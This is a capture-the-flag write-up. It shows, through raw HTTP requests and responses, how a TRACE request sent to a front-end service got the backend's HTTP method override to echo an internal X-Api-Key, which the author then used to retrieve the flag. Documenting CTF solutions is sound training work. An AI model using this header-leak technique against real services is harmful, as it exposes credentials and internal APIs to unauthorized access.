API is looking for API-key to authenticate who can work with service. At first I tried working properly with API by sending POST requests to endpoint:

```
POST /health-check HTTP/1.1

Host: 172.104.154.101:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.104.154.101:8080/
Content-type: application/x-www-form-urlencoded
Content-Length: 43
Connection: close

url=https://sekurak.pl&api_url=health-check
```

Working with service through port 8080 which calls endpoint at port 8081 internally is fine. But for our purposes we need API-key to work directly with that:

```
POST /health-check HTTP/1.1

Host: 172.104.154.101:8081
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.104.154.101:8080/
Content-type: application/x-www-form-urlencoded
Content-Length: 22
Connection: close

url=https://sekurak.pl
```

Response is as the following:

```
Incorrect X-Api-Key
```

Then let's try smoe other methods like TRACE GET PUT...:

```
TRACE /health-check HTTP/1.1

Host: 172.104.154.101:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.104.154.101:8080/
Content-type: application/x-www-form-urlencoded
Content-Length: 22
Connection: close
X-Api-Key: foo

url=https://sekurak.pl
```

and see the response:

```
Content-Type: text/html; charset=utf-8
Content-Length: 221
Date: Sun, 10 Jun 2018 22:21:10 GMT
Connection: close

POST /health-check?_method=trace HTTP/1.1
X-Api-Key: s4OyvDDJKKVbkkx1Ap85pZMFytqB9PtG
host: 127.0.0.1:8081
content-type: application/x-www-form-urlencoded
content-length: 28
Connection: close

url=https%3A%2F%2Fsekurak.pl
```

WoW, awesome :D

let's try to get flag:

```
POST /flag HTTP/1.1

Host: 172.104.154.101:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.104.154.101:8080/
Content-type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close
X-Api-Key: s4OyvDDJKKVbkkx1Ap85pZMFytqB9PtG

action=get
```

and here is the shiny flag:

```
Bravo! Flag: ROZWAL_{0VERRID3httpMETH0D}
```

congratz,
@pwnslinger
